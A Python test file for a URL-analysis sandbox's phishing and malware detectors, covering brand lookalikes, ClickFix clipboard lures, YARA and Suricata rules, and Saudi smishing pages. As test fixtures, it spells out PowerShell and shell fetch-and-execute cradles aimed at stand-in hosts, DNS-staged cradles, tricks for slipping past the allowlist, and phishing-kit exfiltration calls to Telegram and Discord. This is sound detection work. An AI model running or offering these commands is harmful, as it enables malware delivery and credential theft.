"""Detection-quality regressions: known false positives must stay quiet and the true
positives next to them must still fire. Each case is a minimal synthetic capture.
"""

import pytest

from sandbox.analysis.domains import (
    BrandRef,
    is_confusable_idn,
    lookalike,
    normalise_brand_domain,
    owned_by,
)
from sandbox.analysis.engine import behaviour_hits
from sandbox.analysis.facts import CaptureData, build_facts, obfuscation
from sandbox.analysis.local import builtin_behaviour
from sandbox.analysis.scoring import score
from sandbox.rules import defaults
from sandbox.rules.importer import parse_suricata_line, yara_metadata

BRANDS = [BrandRef(n, tuple(k), tuple(d)) for n, k, d in defaults.DEFAULT_BRANDS]
GOOGLE = next(b for b in BRANDS if b.name == "Google")


def _page(url, title="", text="", forms=(), loose_password=0):
    return {
        "frames": [
            {
                "url": url,
                "title": title,
                "text": text,
                "forms": list(forms),
                "iframes": [],
                "loose_password_fields": loose_password,
            }
        ]
    }


def _data(final_url, pages=(), **result) -> CaptureData:
    base = {
        "url": final_url,
        "final_url": final_url,
        "pages": list(pages),
        "redirects": [],
        "navigations": [{"url": final_url}],
        "hosts": {},
    }
    return CaptureData(result={**base, **result}, brands=BRANDS)


def _hits(data: CaptureData) -> set[str]:
    return {h["rule_name"] for h in behaviour_hits(builtin_behaviour(), build_facts(data))}


PASSWORD_FORM = {"action": "", "fields": [{"type": "email"}, {"type": "password"}]}


# --- brand ownership ------------------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    [
        "doodles.google",  # doodles.google.com redirects here
        "blog.google",
        "www.google.de",
        "www.google.co.uk",
        "google.com.au",
        "www.youtube.com",
        "accounts.google.com",
    ],
)
def test_google_owns(host):
    assert GOOGLE.owns(host)


@pytest.mark.parametrize(
    "host", ["google.tk", "google-login.xyz", "googlee.com", "notgoogle.com", "google.evil.com"]
)
def test_google_does_not_own(host):
    assert not GOOGLE.owns(host)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("Google.com", "google.com"),
        ("*.google.com", "google.com"),
        ("google", "google"),
        ("google.*", "google.*"),
        ("bad domain", None),
        ("a.b.*", None),
        ("-x.com", None),
    ],
)
def test_normalise_brand_domain(raw, expected):
    assert normalise_brand_domain(raw) == expected


def test_owned_by_plain_entries_need_a_label_boundary():
    assert owned_by("login.paypal.com", ["paypal.com"])
    assert not owned_by("evilpaypal.com", ["paypal.com"])


# --- brand impersonation --------------------------------------------------------------


def test_google_doodles_is_not_impersonation():
    """Regression: doodles.google (a Google brand TLD) was scored as impersonating Google."""
    page = _page(
        "https://doodles.google/",
        title="Google Doodles",
        text="Google Doodles archive. Sign in with your Google account. Gmail",
    )
    data = _data("https://doodles.google/", [page])
    facts = build_facts(data)
    assert facts["brand"]["name"] is None
    assert "brand_impersonation" not in _hits(data)


def test_brand_mention_without_credentials_is_not_impersonation():
    page = _page(
        "https://news.example/tech",
        title="Google announces new Gmail features",
        text="Google said on Tuesday that Gmail will ...",
    )
    data = _data("https://news.example/tech", [page])
    assert build_facts(data)["brand"]["credential_prompt"] is False
    assert "brand_impersonation" not in _hits(data)


def test_newsletter_email_box_is_not_a_credential_prompt():
    page = _page(
        "https://news.example/tech",
        title="Google announces new Gmail features",
        text="Log in to comment. Subscribe to our newsletter for Google news.",
        forms=[{"action": "https://news.example/sub", "fields": [{"type": "email"}]}],
    )
    assert "brand_impersonation" not in _hits(_data("https://news.example/tech", [page]))


def test_brand_phishing_page_is_impersonation():
    page = _page(
        "https://secure-account.example/",
        title="Sign in - Google Accounts",
        text="Google. Sign in to continue to Gmail",
        forms=[PASSWORD_FORM],
    )
    data = _data("https://secure-account.example/", [page])
    facts = build_facts(data)
    assert facts["brand"]["name"] == "Google"
    assert facts["brand"]["credential_prompt"] is True
    assert "brand_impersonation" in _hits(data)


def test_two_step_login_email_page_is_impersonation():
    page = _page(
        "https://m365-portal.example/",
        title="Sign in to your Microsoft account",
        text="Microsoft Sign in. Email, phone, or Skype",
        forms=[{"action": "", "fields": [{"type": "email", "name": "loginfmt"}]}],
    )
    assert "brand_impersonation" in _hits(_data("https://m365-portal.example/", [page]))


def test_brand_text_from_earlier_genuine_page_is_not_pooled():
    """A genuine Google page early in the chain must not lend its text to the final page."""
    google = _page("https://www.google.com/", title="Google", text="Google Gmail Images")
    final = _page("https://shop.example/login", title="Shop", text="Log in", forms=[PASSWORD_FORM])
    data = _data("https://shop.example/login", [google, final])
    assert "brand_impersonation" not in _hits(data)


def test_keyword_matches_whole_words_only():
    page = _page(
        "https://shop.example/",
        title="Purchase orders",
        text="Purchase your order",
        forms=[PASSWORD_FORM],
    )
    assert build_facts(_data("https://shop.example/", [page]))["brand"]["name"] is None


# --- lookalikes and IDNs ----------------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    [
        "outlook.corp-example.com",  # self-hosted webmail
        "offices.com",
        "static.com",  # one edit from gstatic
        "chrome-plating.example",
        "doodles.google",
        "www.google.de",
        "apple-orchard.example",
    ],
)
def test_lookalike_false_positives(host):
    assert lookalike(host, BRANDS, set()) is None


@pytest.mark.parametrize(
    "host", ["0ffice.com", "g00gle.com", "paypal-verify.example", "amazon-billing.example"]
)
def test_lookalike_still_detected(host):
    assert lookalike(host, BRANDS, set()) is not None


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("xn--pypal-4ve.com", True),  # pаypal with a Cyrillic а
        ("xn--80ak6aa92e.com", True),  # аррӏе, all Cyrillic lookalikes
        ("xn--e1afmkfd.xn--p1ai", False),  # пример.рф, ordinary Cyrillic
        ("example.com", False),
    ],
)
def test_confusable_idn(host, expected):
    assert is_confusable_idn(host) is expected


# --- forms ------------------------------------------------------------------------------


def test_same_brand_credential_post_is_not_cross_domain():
    page = _page(
        "https://login.live.com/",
        title="Sign in",
        forms=[{"action": "https://login.microsoftonline.com/ppsecure/post.srf", **PASSWORD_FORM}],
    )
    assert "form_posts_cross_domain" not in _hits(_data("https://login.live.com/", [page]))


def test_javascript_action_is_not_cross_domain():
    form = {"action": "javascript:void(0)", "fields": [{"type": "password"}]}
    page = _page("https://app.example/login", forms=[form])
    assert "form_posts_cross_domain" not in _hits(_data("https://app.example/login", [page]))


def test_mailto_action_is_cross_domain():
    form = {"action": "mailto:drop@evil.example", "fields": [{"type": "password"}]}
    page = _page("https://app.example/login", forms=[form])
    assert "form_posts_cross_domain" in _hits(_data("https://app.example/login", [page]))


def test_password_form_on_new_domain():
    page = _page("https://fresh.example/", forms=[PASSWORD_FORM])
    data = _data("https://fresh.example/", [page])
    data.domain_ages = {"fresh.example": 5}
    assert "credential_form_on_new_domain" in _hits(data)
    data.domain_ages = {"fresh.example": 500}
    assert "credential_form_on_new_domain" not in _hits(data)


def test_young_third_party_domain_is_not_newly_registered():
    data = _data("https://start.example/")
    data.domain_ages = {"start.example": 4000, "ads-cdn.example": 3}
    assert "newly_registered_domain" not in _hits(data)


# --- clipboard ---------------------------------------------------------------------------


def _clip(text):
    return [{"page": "p0", "api": "navigator.clipboard.writeText", "text": text}]


@pytest.mark.parametrize(
    "text",
    [
        'powershell -w hidden -c "iwr http://x.example/a.ps1 | iex"',
        "powershell -enc " + "A" * 60,
        "mshta https://x.example/verify.hta",
        "cmd /c powershell iex(irm x.example) # I am not a robot - reCAPTCHA ID 4821",
        '/bin/bash -c "$(curl -fsSL https://x.example/install.sh)"',
        # finger.exe cradle seen in the wild: %COMSPEC%, caret-escaped binary, padded decoy.
        '%COMSPEC% /c start "" /min for /f "delims=@" %m in '
        "(',f^^i^^n^^g^^e^^r RscncqFRZn@id-dns.net') do %m &                "
        "--------------P_u_s_h----t_h_e----_E_n_t_e_r_----k_e_y--      ",
        "finger user@x.example | cmd",
        "cmd /c for /f \"tokens=*\" %a in ('curl -s x.example/p') do %a",
        'p""owershell -w h -c "irm x.example|iex"',
    ],
)
def test_clickfix_commands(text):
    hits = _hits(_data("https://start.example/", clipboard=_clip(text)))
    assert "clickfix_clipboard_command" in hits
    assert "clipboard_command_write" not in hits


def test_docs_copy_button_is_not_clickfix():
    data = _data(
        "https://docs.example/",
        clipboard=_clip("curl https://api.example.com/v1/charges -u sk_test_123:"),
    )
    hits = _hits(data)
    assert "clickfix_clipboard_command" not in hits
    assert "clipboard_command_write" in hits


@pytest.mark.parametrize(
    "text",
    [
        'for /f "tokens=*" %i in (files.txt) do echo %i',
        "pip install --upgrade sandbox-client",
        "cmd /c dir C:\\Users",
    ],
)
def test_docs_cmd_snippets_are_not_clickfix(text):
    assert "clickfix_clipboard_command" not in _hits(
        _data("https://docs.example/", clipboard=_clip(text))
    )


def test_plain_command_with_run_dialog_lure_is_clickfix():
    page = _page(
        "https://verify.example/",
        title="Verify you are human",
        text="Press Win + R, then Ctrl + V and Enter to complete verification",
    )
    data = _data("https://verify.example/", [page], clipboard=_clip("cmd /c start calc"))
    assert "clickfix_clipboard_command" in _hits(data)


# R-01: package-manager install one-liners are fetch-then-run cradles from the vendor's
# own installer host; they must not read as critical ClickFix.
@pytest.mark.parametrize(
    ("page", "text"),
    [
        (
            "https://brew.sh/",
            '/bin/bash -c "$(curl -fsSL '
            'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
        ),
        ("https://docs.astral.sh/uv/", "curl -LsSf https://astral.sh/uv/install.sh | sh"),
        (
            "https://docs.astral.sh/uv/",
            'powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"',
        ),
        ("https://scoop.sh/", "irm get.scoop.sh | iex"),
        (
            "https://chocolatey.org/install",
            "Set-ExecutionPolicy Bypass -Scope Process -Force; "
            "iex ((New-Object System.Net.WebClient).DownloadString("
            "'https://community.chocolatey.org/install.ps1'))",
        ),
        ("https://rustup.rs/", "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"),
    ],
)
def test_homebrew_install_oneliner_is_not_clickfix(page, text):
    data = _data(page, clipboard=_clip(text))
    facts = build_facts(data)
    assert facts["clipboard"]["installer_cradles"] == 1
    hits = _hits(data)
    assert "clickfix_clipboard_command" not in hits
    assert "clipboard_command_write" in hits


def test_encoded_powershell_clipboard_is_clickfix_even_on_allowlisted():
    """An unambiguous trait (hidden window) stays critical, even fetching an installer
    source from an allowlisted page: the source exemption covers bare cradles only."""
    text = 'powershell -w hidden -c "irm https://astral.sh/uv/install.ps1 | iex"'
    data = _data("https://www.bigblog.com/", clipboard=_clip(text))
    data.allowlisted = {"bigblog.com"}
    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
    assert "clickfix_clipboard_command" in _hits(data)


@pytest.mark.parametrize(
    "text",
    [
        # Any repo can be served from raw.githubusercontent.com: only named installers pass.
        "curl -fsSL https://raw.githubusercontent.com/someone/kit/main/x.sh | sh",
        # One installer source does not launder a second, unknown one.
        "irm https://astral.sh/uv/install.ps1 | iex; irm https://x.example/a | iex",
    ],
)
def test_cradle_from_non_installer_source_is_still_clickfix(text):
    assert "clickfix_clipboard_command" in _hits(_data("https://x.example/", clipboard=_clip(text)))


def _installer_urls():
    from sandbox.analysis.facts import INSTALLER_SOURCES

    for host, prefixes in sorted(INSTALLER_SOURCES.items()):
        path = prefixes[0] if prefixes else "/"
        yield f"https://{host}{path}" + ("install.sh" if path.endswith("/") else "")


@pytest.mark.parametrize("url", list(_installer_urls()))
def test_every_installer_source_is_recognised(url):
    """L2 §1.1: INSTALLER_SOURCES is curated data; each entry gets a test."""
    from sandbox.analysis.facts import _clickfix_traits

    assert _clickfix_traits(f"curl -fsSL {url} | sh") == "installer"


def test_unlisted_host_cradle_stays_cradle():
    from sandbox.analysis.facts import _clickfix_traits

    assert _clickfix_traits("curl -fsSL https://astral.sh.evil.example/x | sh") == "cradle"


@pytest.mark.parametrize(
    "text",
    [
        # userinfo: reads as the installer host, fetches from the host after "@"
        "irm https://astral.sh@x.example/a.ps1 | iex",
        "irm astral.sh@x.example | iex",
        # dot segments (literal or %-encoded) climb out of the allowed repo prefix
        "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/../../someone/kit/main/x.sh | sh",  # noqa: E501
        "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/%2e%2e/%2e%2e/someone/kit/main/x.sh | sh",  # noqa: E501
        # no installer one-liner names a port
        "curl -fsSL https://astral.sh:8443/x | sh",
    ],
)
def test_installer_gating_bypasses_are_unambiguous_clickfix(text):
    """L2 §1.1 hardening: URLs dressed as an installer source are worse than a plain
    cradle; they count as unambiguous ClickFix."""
    data = _data("https://x.example/", clipboard=_clip(text))
    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
    assert "clickfix_clipboard_command" in _hits(data)


def test_installer_repo_prefix_is_case_insensitive():
    from sandbox.analysis.facts import _clickfix_traits

    lower = "curl -fsSL https://raw.githubusercontent.com/homebrew/install/HEAD/install.sh | sh"
    assert _clickfix_traits(lower) == "installer"


# DE-CFX-009: the stage comes back in a DNS answer and is executed.
@pytest.mark.parametrize(
    "text",
    [
        'powershell -c "(Resolve-DnsName -Type TXT stage.example -Server 192.0.2.1).Strings | iex"',
        "cmd /c nslookup -q=txt stage.example 192.0.2.1 | cmd",
    ],
)
def test_dns_cradle_clipboard_is_clickfix(text):
    data = _data("https://verify.example/", clipboard=_clip(text))
    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
    assert "clickfix_clipboard_command" in _hits(data)
    from sandbox.analysis.facts import extract_iocs

    iocs = extract_iocs(data, build_facts(data))
    assert "stage.example" in iocs["domains"]
    assert "192.0.2.1" in iocs["ips"]


@pytest.mark.parametrize("text", ["nslookup example.com", "nslookup example.com | findstr Address"])
def test_plain_nslookup_is_not_clickfix(text):
    assert "clickfix_clipboard_command" not in _hits(
        _data("https://docs.example/", clipboard=_clip(text))
    )


# --- downloads ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "head", "disguised"),
    [
        ("invoice.pdf.exe", b"MZ", True),
        ("report.pdf", b"MZ\x90\x00", True),
        ("report.pdf", b"%PDF-1.7", False),
        ("setup.exe", b"MZ", False),
    ],
)
def test_disguised_download(name, head, disguised):
    data = _data("https://start.example/", downloads=[{"sha256": "aa", "suggested_filename": name}])
    data.download_heads = {"aa": head}
    assert ("disguised_download" in _hits(data)) is disguised


def test_unprompted_document_download_is_not_automatic_download():
    data = _data(
        "https://start.example/", downloads=[{"sha256": "aa", "suggested_filename": "menu.pdf"}]
    )
    data.download_heads = {"aa": b"%PDF-1.7"}
    assert "automatic_download" not in _hits(data)


def test_unprompted_archive_is_automatic_download():
    data = _data(
        "https://start.example/", downloads=[{"sha256": "aa", "suggested_filename": "doc.zip"}]
    )
    data.download_heads = {"aa": b"PK\x03\x04"}
    assert "automatic_download" in _hits(data)


# --- redirects ---------------------------------------------------------------------------


def test_same_site_canonicalisation_hops_are_not_suspicious():
    hops = [
        {"from": "http://shop.example/", "to": "https://shop.example/", "type": "http_301"},
        {"from": "https://shop.example/", "to": "https://www.shop.example/", "type": "http_301"},
        {"from": "https://www.shop.example/", "to": "https://www.shop.example/en", "type": "js"},
        {"from": "https://www.shop.example/en", "to": "https://www.shop.example/en/", "type": "js"},
    ]
    assert "suspicious_redirect_chain" not in _hits(
        _data("https://www.shop.example/en/", redirects=hops)
    )


def test_google_sso_hops_are_same_site():
    hops = [
        {"from": "https://www.youtube.com/", "to": "https://accounts.google.com/", "type": "js"},
        {"from": "https://accounts.google.com/", "to": "https://www.google.de/", "type": "js"},
        {"from": "https://www.google.de/", "to": "https://doodles.google/", "type": "js"},
    ]
    facts = build_facts(_data("https://doodles.google/", redirects=hops))
    assert facts["redirects"]["cross_domain"] == 0


# --- scripts -----------------------------------------------------------------------------


def test_obfuscator_io_detected_without_catastrophic_backtracking():
    names = " ".join(f"var _0x{i:04x}=1;" for i in range(25))
    assert "obfuscator_io" in obfuscation(names)[1]
    # 19 distinct names in a large file: below threshold, and must return promptly.
    near_miss = " ".join(f"_0x{i:04x}" for i in range(19)) + " x" * 200_000
    assert "obfuscator_io" not in obfuscation(near_miss)[1]


# --- YARA --------------------------------------------------------------------------------


def _yara(name):
    import yara

    return yara.compile(source=defaults.BUILTIN_YARA[name])


@pytest.mark.parametrize(
    ("rule", "content", "expected"),
    [
        # WordPress login: password field and "login.php" are not a phishing kit.
        (
            "phishkit_credential_exfil",
            b'<form action="wp-login.php"><input type="password" name="pwd"></form>',
            False,
        ),
        (
            "phishkit_credential_exfil",
            b'fetch("https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"'
            b'+"/sendMessage",{method:"POST"})',
            True,
        ),
        (
            "phishkit_credential_exfil",
            b'$.post("https://discord.com/api/webhooks/123456789012345678/abc", data)',
            True,
        ),
        # An SPA "export CSV" button.
        (
            "html_smuggling_blob_download",
            b"const b=new Blob([csv]);a.href=URL.createObjectURL(b);a.download='report.csv';"
            b"a.click()",
            False,
        ),
        (
            "html_smuggling_blob_download",
            b"var b=new Blob([d]);a.href=URL.createObjectURL(b);a.download='Invoice.iso';a.click()",
            True,
        ),
        (
            "html_smuggling_blob_download",
            b'var p="' + b"QUJD" * 600 + b'";var d=atob(p);var b=new Blob([d]);'
            b"a.href=URL.createObjectURL(b);a.download=name;a.click()",
            True,
        ),
        # A page that says "verify" and uses Ctrl+V somewhere, with "iex" inside a word.
        (
            "clickfix_powershell_lure",
            b"<p>Verify your email. Paste with Ctrl+V.</p><script>var pieX=1</script>",
            False,
        ),
        (
            "clickfix_powershell_lure",
            b"<h2>I'm not a robot</h2><p>Press Win+R, paste with Ctrl+V and press Enter</p>"
            b"<script>navigator.clipboard.writeText(cmd)</script>",
            True,
        ),
        ("hta_application", b'<HTA:APPLICATION ID="x" WINDOWSTATE="minimize">', True),
        ("windows_executable", b"MZ", False),  # truncated header must not read out of bounds
    ],
)
def test_builtin_yara(rule, content, expected):
    assert bool(_yara(rule).match(data=content)) is expected


def test_builtin_yara_metadata_parses_tags_on_their_own_line():
    meta = yara_metadata(defaults.BUILTIN_YARA["clickfix_powershell_lure"])
    assert meta["tags"] == ["clickfix"]
    assert meta["severity"] == "critical"
    assert meta["attack_ids"] == ["T1204.004"]


# --- Suricata ----------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("line", "severity"),
    [
        (
            'alert http any any -> any any (msg:"ET MALWARE Stealer"; classtype:trojan-activity; '
            "sid:1; metadata: signature_severity Major;)",
            "high",
        ),
        (
            'alert dns any any -> any any (msg:"ET INFO Observed DNS Query to .top"; '
            "classtype:bad-unknown; sid:2;)",
            "info",
        ),
        (
            'alert http any any -> any any (msg:"ET PHISHING Kit"; classtype:social-engineering; '
            "sid:3;)",
            "medium",
        ),
        (
            'alert tls any any -> any any (msg:"ET POLICY TLS"; classtype:policy-violation; '
            "sid:4; metadata: signature_severity Informational;)",
            "info",
        ),
    ],
)
def test_suricata_severity(line, severity):
    assert parse_suricata_line(line)["severity"] == severity


def test_informational_suricata_alerts_do_not_score():
    alerts = [
        {"sid": 1, "signature": "ET INFO Observed DNS Query to .cloud TLD", "severity": 2},
        {"sid": 2, "signature": "ET POLICY curl User-Agent Outbound", "severity": 2},
        {"sid": 3, "signature": "SURICATA STREAM 3way handshake wrong seq", "severity": 3},
    ]
    result = score(
        rule_hits=[],
        indicator_hits=[],
        suricata_alerts=alerts,
        weights={},
        thresholds={"suspicious": 30, "malicious": 70},
        allowlisted=set(),
        capture_ok=True,
    )
    assert result.score == 0
    assert result.verdict == "benign"


def test_suricata_alerts_scale_by_severity_and_are_capped():
    alerts = [{"sid": i, "signature": f"ET MALWARE x{i}", "severity": 1} for i in range(5)]
    result = score(
        rule_hits=[],
        indicator_hits=[],
        suricata_alerts=alerts,
        weights={},
        thresholds={"suspicious": 30, "malicious": 70},
        allowlisted=set(),
        capture_ok=True,
    )
    assert result.score == 45


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("login.kit.pages.dev", ["login.kit.pages.dev", "kit.pages.dev", "pages.dev"]),
        (
            "www.evil.example.co.uk",
            ["www.evil.example.co.uk", "evil.example.co.uk", "example.co.uk"],
        ),
        ("evil.com", ["evil.com"]),
        ("10.0.0.1", ["10.0.0.1"]),
    ],
)
def test_parent_domains_for_feed_matching(host, expected):
    from sandbox.analysis.domains import parent_domains

    assert parent_domains(host) == expected


# --- feed matching: scheme, submitted URL, host root (the new-18a.pages.dev case) -------


def test_feed_http_url_matches_https_visit():
    """The feed lists http://, Chrome upgraded .dev (HSTS preload) to https:// itself."""
    from sandbox.analysis.engine import match_candidates

    result = {
        "url": "http://new-18a.pages.dev/",
        "final_url": "https://new-18a.pages.dev/",
        "navigations": [{"url": "https://new-18a.pages.dev/"}],
        "redirects": [],
        "hosts": {"new-18a.pages.dev": ["104.21.0.1"]},
    }
    values = match_candidates(result, [], ["new-18a.pages.dev"])
    assert "http://new-18a.pages.dev/" in values["url"]
    assert "https://new-18a.pages.dev/" in values["url"]


def test_feed_root_url_matches_deeper_page_and_submitted_url_counts():
    from sandbox.analysis.engine import match_candidates

    result = {"url": "https://kit.web.app/login", "final_url": "https://kit.web.app/login"}
    values = match_candidates(result, [], ["kit.web.app"], submitted=["kit.web.app/login?x=1"])
    assert "http://kit.web.app/" in values["url"]  # the host root, both schemes
    assert "https://kit.web.app/login?x=1" in values["url"]  # the submitted URL itself


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("kit.pages.dev", "kit.pages.dev"),
        ("a.b.kit.pages.dev", "kit.pages.dev"),
        ("pages.dev", "pages.dev"),
        ("sites.google.com", "sites.google.com"),
        ("www.example.co.uk", "example.co.uk"),
    ],
)
def test_site_unit(host, expected):
    from sandbox.analysis.domains import site

    assert site(host) == expected


def test_allowlisted_platform_does_not_vouch_for_its_tenants():
    # pages.dev and web.app are Tranco top sites; their tenants are not.
    assert lookalike("paypal-login.web.app", BRANDS, {"web.app"}) is not None


# --- free hosting, UGC and government lookalikes -------------------------------------


def test_trezor_seo_page_on_free_hosting():
    """The live typedream.app page: brand + login title, no form."""
    page = _page(
        "https://start-io-login-trezr-cdn.typedream.app/",
        title="Trezor @Login | The official wallet* Secure your crypto assets",
        text="Trezor Login: The Ultimate Guide to Secure Crypto Access",
    )
    data = _data("https://start-io-login-trezr-cdn.typedream.app/", [page])
    data.allowlisted = {"typedream.app"}
    assert "brand_on_free_hosting" in _hits(data)


def test_ups_login_title_attributes_to_ups():
    """§3: 'UPS' is an acronym brand: exact case in the title, with login context."""
    url = "https://parcel-redelivery.example/"
    page = _page(url, title="UPS Login | Track your parcel", forms=[PASSWORD_FORM])
    brand = build_facts(_data(url, [page]))["brand"]
    assert brand["name"] == "UPS"
    assert brand["credential_prompt"] is True


def test_popups_signups_text_not_ups():
    url = "https://app.example/settings"
    page = _page(
        url,
        title="POP-UPS and SIGN-UPS | Account",
        forms=[PASSWORD_FORM],
        text="Manage your sign-ups and pop-ups. UPS",
    )  # noqa: E501
    assert build_facts(_data(url, [page]))["brand"]["name"] != "UPS"


def test_ups_mention_without_login_context_quiet():
    url = "https://news.example/markets"
    page = _page(url, title="UPS reports quarterly earnings", text="Shares rose")
    assert build_facts(_data(url, [page]))["brand"]["name"] != "UPS"


def test_dhl_and_stc_keywords_stay_whole_word():
    """Recorded disagreement with §3.3: plain keywords are already whole-word, so 'dhl'
    never matches inside 'dhlpipeline', and moving DHL/STC to case-sensitive acronyms
    would miss lower-case mentions ('track your dhl parcel')."""
    from sandbox.analysis.facts import _keyword

    assert not _keyword("dhl").search("dhlpipeline build")
    assert _keyword("dhl").search("track your dhl parcel")


@pytest.mark.parametrize(
    ("host", "expected"),
    [("ups-tracking.xyz", "UPS"), ("ups-and-downs-blog.com", None), ("ups.com", None)],
)
def test_acronym_lookalike_needs_a_context_token(host, expected):
    hit = lookalike(host, BRANDS, set())
    assert (hit["brand"] if hit else None) == expected


@pytest.mark.parametrize(
    ("host", "platform"),
    [
        ("ups-flow-harvester.lovable.app", "lovable.app"),
        ("preview-1a2b.lovableproject.com", "lovableproject.com"),
        ("okta-sso.base44.app", "base44.app"),
        ("m365-login.bolt.host", "bolt.host"),
        ("v0-okta-clone.vercel.app", "vercel.app"),
    ],
)
def test_ai_builder_hosts_are_tenanted_free_hosting(host, platform):
    """DE-PHI-013: AI site builders are free hosting, so each tenant is its own site and
    allowlisting the platform never vouches for a kit on it."""
    from sandbox.analysis.domains import free_hosting, site

    assert free_hosting(host) == platform
    assert site(host) == host.split(".", 1)[0] + "." + platform


def test_brand_lure_on_lovable_is_flagged_and_demo_is_quiet():
    url = "https://m365-docs-share.lovable.app/"
    lure = _page(
        url, title="Microsoft 365 | Sign in to view document", text="Microsoft OneDrive shared file"
    )  # noqa: E501
    data = _data(url, [lure])
    data.allowlisted = {"lovable.app"}
    assert "brand_on_free_hosting" in _hits(data)
    demo = _page("https://todo-demo.lovable.app/", title="Todo app", text="My tasks")
    assert "brand_on_free_hosting" not in _hits(_data("https://todo-demo.lovable.app/", [demo]))


def test_brand_article_off_free_hosting_is_not_flagged():
    page = _page("https://news.example/", title="Trezor login guide", text="Trezor wallet review")
    assert "brand_on_free_hosting" not in _hits(_data("https://news.example/", [page]))


def test_brand_login_on_brand_owned_ugc_host_is_impersonation():
    """Microsoft-themed phish on Azure blob storage: windows.net no longer shields it."""
    url = "https://office365login.blob.core.windows.net/index.html"
    page = _page(
        url, title="Sign in to your Microsoft account", text="Microsoft", forms=[PASSWORD_FORM]
    )
    assert "brand_impersonation" in _hits(_data(url, [page]))


@pytest.mark.parametrize(
    "host",
    ["absher-gov-sa.com", "moi.gov.sa.verify-id.com", "govsa-fines.net", "gov-uk.tax-refund.xyz"],
)
def test_government_lookalike_detected(host):
    from sandbox.analysis.domains import government_lookalike

    assert government_lookalike(host, BRANDS, set()) is not None


@pytest.mark.parametrize(
    "host",
    [
        "www.absher.sa",
        "www.moi.gov.sa",
        "www.gov.uk",
        "ec2.us-gov-west-1.amazonaws.com",
        "gov.teams.microsoft.us",
        "govdelivery.com",
        "www.usa.gov",
    ],
)
def test_government_lookalike_not_detected(host):
    from sandbox.analysis.domains import government_lookalike

    assert government_lookalike(host, BRANDS, set()) is None


@pytest.mark.parametrize(
    ("host", "brand"),
    [
        ("alrajhi-online.com", "Al Rajhi Bank"),
        ("absher-sa.com", "Absher"),
        ("splonline-track.com", "Saudi Post (SPL)"),
    ],
)
def test_saudi_lookalikes(host, brand):
    found = lookalike(host, BRANDS, set())
    assert found is not None and found["brand"] == brand


def test_saudi_brand_owned_domains():
    owners = {b.name: b for b in BRANDS}
    assert owners["Absher"].owns("www.absher.sa")
    assert owners["Absher"].owns("www.moi.gov.sa")  # any government site may mention Absher
    assert owners["Google"].owns("www.google.com.sa")
    assert not owners["Absher"].owns("absher.sa.example.com")


# --- Saudi smishing payloads: card, OTP, pretext -------------------------------------

CARD_FORM = {
    "action": "",
    "fields": [
        {"type": "text", "name": "cardNumber"},
        {"type": "text", "name": "expiry_date"},
        {"type": "text", "name": "cvv"},
    ],
}


def test_spl_redelivery_fee_card_harvest():
    url = "https://splonline-track.com/pay"
    page = _page(
        url,
        title="البريد السعودي | إعادة التوصيل",
        text="شحنتك معلقة بسبب عنوان غير مكتمل. يرجى دفع رسوم إعادة التوصيل 2.00 ريال",
        forms=[CARD_FORM],
    )
    facts = build_facts(_data(url, [page]))
    assert facts["lure"]["payment_pretext"] > 0
    assert facts["brand"]["name"] == "Saudi Post (SPL)" and facts["brand"]["prompt"] == "payment"
    hits = _hits(_data(url, [page]))
    assert {"payment_card_harvest", "brand_impersonation", "lookalike_domain"} <= hits


def test_absher_otp_harvest():
    url = "https://absher-sa.com/verify"
    page = _page(
        url,
        title="أبشر - التحقق",
        text="أدخل رمز التحقق المرسل إلى جوالك",
        forms=[{"action": "", "fields": [{"type": "text", "name": "otp"}]}],
    )
    assert {"otp_harvest", "lookalike_domain"} <= _hits(_data(url, [page]))


def test_real_absher_otp_page_is_quiet():
    url = "https://www.absher.sa/portal/verify"
    page = _page(
        url,
        title="أبشر - التحقق",
        text="أدخل رمز التحقق",
        forms=[{"action": "", "fields": [{"type": "text", "name": "otp"}]}],
    )
    assert not _hits(_data(url, [page])) & {
        "otp_harvest",
        "brand_impersonation",
        "lookalike_domain",
    }


def test_plain_checkout_is_only_a_low_signal():
    url = "https://shop.example/checkout"
    page = _page(url, title="Checkout", text="Order summary", forms=[CARD_FORM])
    hits = _hits(_data(url, [page]))
    assert "payment_card_form" in hits
    assert "payment_card_harvest" not in hits


def test_seed_phrase_harvest_and_real_wallet():
    form = {"action": "", "fields": [{"tag": "textarea", "type": "textarea", "name": "phrase"}]}
    text = "Import your wallet. Enter your 12-word secret recovery phrase"
    fake = _page(
        "https://wallet-sync.example/import", title="Restore wallet", text=text, forms=[form]
    )
    assert "seed_phrase_harvest" in _hits(_data("https://wallet-sync.example/import", [fake]))
    real = _page("https://metamask.io/import", title="MetaMask", text=text, forms=[form])
    assert "seed_phrase_harvest" not in _hits(_data("https://metamask.io/import", [real]))


def test_arabic_keywords_match_whole_words_only():
    from sandbox.analysis.facts import _keyword

    assert _keyword("نسك").search("منصة نسك للحج")
    assert not _keyword("نسك").search("أداء المناسك")


def test_bip39_wordlist_yara():
    words = b'["abandon","ability","able","about","above", "...", "zero","zone","zoo"]'
    assert _yara("bip39_wordlist_embedded").match(data=words)
    assert not _yara("bip39_wordlist_embedded").match(data=b"abandon ship, above all")


# --- helpers for HAR / raw-DOM / result-backed captures -------------------------------


def _req(url, method="GET", post="", status=200, req_headers=None, set_cookie=None, body=""):
    return {
        "request": {
            "method": method,
            "url": url,
            "headers": [{"name": k, "value": v} for k, v in (req_headers or {}).items()],
            "postData": {"text": post} if post else {},
        },
        "response": {
            "status": status,
            "headers": [{"name": "set-cookie", "value": c} for c in (set_cookie or [])],
            "content": {"text": body},
        },
    }


def _cap(final_url, pages=(), har=(), dom_html=(), allowlisted=(), requests=(), **result):
